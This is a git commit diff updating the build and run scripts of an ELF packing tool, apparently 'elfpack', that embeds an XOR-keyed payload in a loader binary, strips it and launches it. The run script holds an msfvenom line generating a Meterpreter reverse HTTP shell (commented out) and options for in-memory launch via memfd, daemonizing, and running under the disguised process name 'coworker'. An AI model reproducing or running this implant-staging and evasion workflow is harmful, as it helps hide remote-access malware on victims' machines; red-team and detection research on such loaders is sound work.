b02beca43386fc3f6a99dc5caa9a264715699ff3
D.X.S <@>
2022-06-28 12:46:55 -0500

    Updates

--- build.sh
+++ build.sh
@@ -1,3 +1,6 @@
 #!/bin/bash 
-cmake --build /home/dev/Code/elfpack/cmake-build-debug --target clean
-cmake --build /home/dev/Code/elfpack/cmake-build-debug --target all
+#cmake --build /home/dev/Code/elfpack/cmake-build-debug --target clean
+#cmake --build /home/dev/Code/elfpack/cmake-build-debug --target all
+cmake --config .
+cmake --build . --target clean
+cmake --build . --target all
--- run.sh
+++ run.sh
@@ -1,13 +1,10 @@
 #!/bin/bash
 
-#msfvenom -p linux/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4443  -f elf > /tmp/elf_loader/mettle-shell.elf
-
-BUILD_TARGET="Debug"
-ELFPACK="./bin/${BUILD_TARGET}/elfpack"
-ELFLDR="./bin/${BUILD_TARGET}/elfldr"
+ELFPACK="./bin/elfpack"
+ELFLDR="./bin/elfldr"
 
 HOST_ELF_FILE=${ELFLDR}
-WORK_DIR="/tmp/elf_loader"
+WORK_DIR="/tmp/elfpack_staging"
 DST_ELF_FILE="${WORK_DIR}/injected-cradle"  # Loader bootstrapping paylaod
 PAYLOAD_FILE="${WORK_DIR}/mettle-shell.elf" # ELF payload
 
@@ -19,7 +16,6 @@ XOR_KEY=""
 RED=$(tput setaf 1)
 GREEN=$(tput setaf 2)
 RESET=$(tput sgr0)
-
 
 
 if [[ $# -eq 0 ]]
@@ -46,25 +42,57 @@ then
 fi
 
 
+#echo [TASK: OPTIONAL] "${GREEN}" ============= Generating payload: mettle shell ${RESET} ================
+#echo "msfvenom -p linux/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4443  -f elf \> ${WORK_DIR}/mettle-shell.elf"
+#msfvenom -p linux/x64/meterpreter_reverse_http LHOST=127.0.0.1 LPORT=4443  -f elf > ${WORK_DIR}/mettle-shell.elf
 
-echo [TASK] "${GREEN}" ============= Packing with $ELFPACK ${RESET} ================
-echo ${GREEN} host file ${HOST_ELF_FILE} with ${PAYLOAD_FILE} into ${DST_ELF_FILE} within section "${DST_ELF_SECTION}" \
-  as record  ${DST_DESC_NAME}, algo ${DST_ELF_META_ALGO} with key: "${XOR_KEY}" ${RESET}
+echo [TASK] "${GREEN}"Packing payload with $ELFPACK ${RESET}
+printf  "%s" "${GREEN} Injecting loader ${HOST_ELF_FILE} with payload ${PAYLOAD_FILE} into destination ${DST_ELF_FILE} with options:
+- as section ${DST_ELF_SECTION}
+- as TOC record ${DST_DESC_NAME}
+- with algo ${DST_ELF_META_ALGO}
+- with key: ${XOR_KEY} ${RESET}
+"
 
 echo [CMD] ${RED} $ELFPACK ${HOST_ELF_FILE} ${PAYLOAD_FILE} ${DST_ELF_FILE} "${DST_ELF_SECTION}" ${DST_DESC_NAME} ${DST_ELF_META_ALGO} "${XOR_KEY}" ${RESET}
 $ELFPACK ${HOST_ELF_FILE} ${PAYLOAD_FILE} ${DST_ELF_FILE} "${DST_ELF_SECTION}" ${DST_DESC_NAME} ${DST_ELF_META_ALGO} "${XOR_KEY}"
 
-echo [TASK] ${GREEN} ============= Stripping symbols but not sections ${RESET} ==================
+echo [TASK] ${GREEN}Stripping symbols but not sections ${RESET}
 echo [CMD] ${RED} strip $DST_ELF_FILE ${RESET}
 strip $DST_ELF_FILE
 
-echo [TASK] ${GREEN} ============= Executing $DST_ELF_FILE ${RESET} ==============
-echo [CMD] ${RED} chmod +rx $DST_ELF_FILE '&&'  $DST_ELF_FILE  "${PAY_OPTS[@]}" ${RESET}
+echo [TASK] ${GREEN}Prepareing package for execution ${RESET}
+echo [CMD] ${RED} chmod +rx $DST_ELF_FILE
 chmod +rx $DST_ELF_FILE
 
-echo "Command to launch :" $DST_ELF_FILE  "${PAY_OPTS[@]}"
-echo "Setup is done, ready to launch? <ENTER>"
-read -r
+echo [TASK:OPTIONAL] ${GREEN} Executing package ${DST_ELF_FILE} ${RESET}
 
-$DST_ELF_FILE  "${PAY_OPTS[@]}"
+# No options how to run the stage supplied, give options
+if [[ ${#PAY_OPTS[@]} -eq 0 ]]
+then
+  printf "%s" "No options supplied. Options available:
+
+  # launch payload via uexec
+  ${DST_ELF_FILE}
+
+  # launch payload via memfd(4)
+  ${DST_ELF_FILE} -m
+
+  # launch daemonized (at loader level)
+  ${DST_ELF_FILE} -d
+
+  # loader: daemonize, launch via memfd(4), then pass params to payloads if any
+  #Ex: mettle:
+  # -b, --background <0|1> start as a background service (0 disable, 1 enable)
+  # -n, --name <name>      name to start as
+  # -c, --console
+  ${DST_ELF_FILE} -m -d -- -b 0 -n coworker -c
+
+  Choose one
+  "
+else
+  echo [CMD]options: "${PAY_OPTS[@]}" ${RESET}
+  $DST_ELF_FILE  "${PAY_OPTS[@]}"
+fi
+
 
